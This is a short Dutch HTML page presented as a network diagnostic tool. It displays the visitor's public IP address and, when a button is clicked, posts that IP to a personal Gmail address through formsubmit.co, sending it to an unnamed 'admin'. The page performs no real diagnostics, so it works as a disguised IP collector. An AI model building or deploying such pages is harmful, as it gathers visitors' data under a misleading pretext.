<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netwerk Diagnostiek Tool</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; padding: 50px; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
        .ip-box { font-family: monospace; background: #eee; padding: 10px; border-radius: 5px; margin: 20px 0; font-size: 1.2em; color: #1a73e8; }
        button { background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold; }
        button:hover { background: #1557b0; }
    </style>
</head>
<body>

<div class="card">
    <h2>Netwerk Analyse</h2>
    <p>Uw huidige publieke IP-adres is:</p>
    <div id="ip-display" class="ip-box">Laden...</div>
    
    <form id="ipForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
        <input type="hidden" name="user_ip" id="hiddenIP">
        <input type="hidden" name="_subject" value="Nieuwe Netwerk Scan">
        <button type="submit">Verstuur Diagnostiek naar Admin</button>
    </form>
    
    <p id="status" style="margin-top:15px; font-size: 0.9em; color: green; display: none;">Gegevens succesvol verzonden!</p>
</div>

<script>
    // Haal het IP-adres op via een gratis API
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById('ip-display').innerText = data.ip;
            document.getElementById('hiddenIP').value = data.ip;
        })
        .catch(err => {
            document.getElementById('ip-display').innerText = "Fout bij laden";
        });

    // Formulier versturen via AJAX (zodat de pagina niet ververst)
    document.getElementById('ipForm').addEventListener('submit', function(e) {
        e.preventDefault();
        fetch(this.action, {
            method: 'POST',
            body: new FormData(this)
        }).then(() => {
            document.getElementById('status').style.display = 'block';
        });
    });
</script>

</body>
</html>
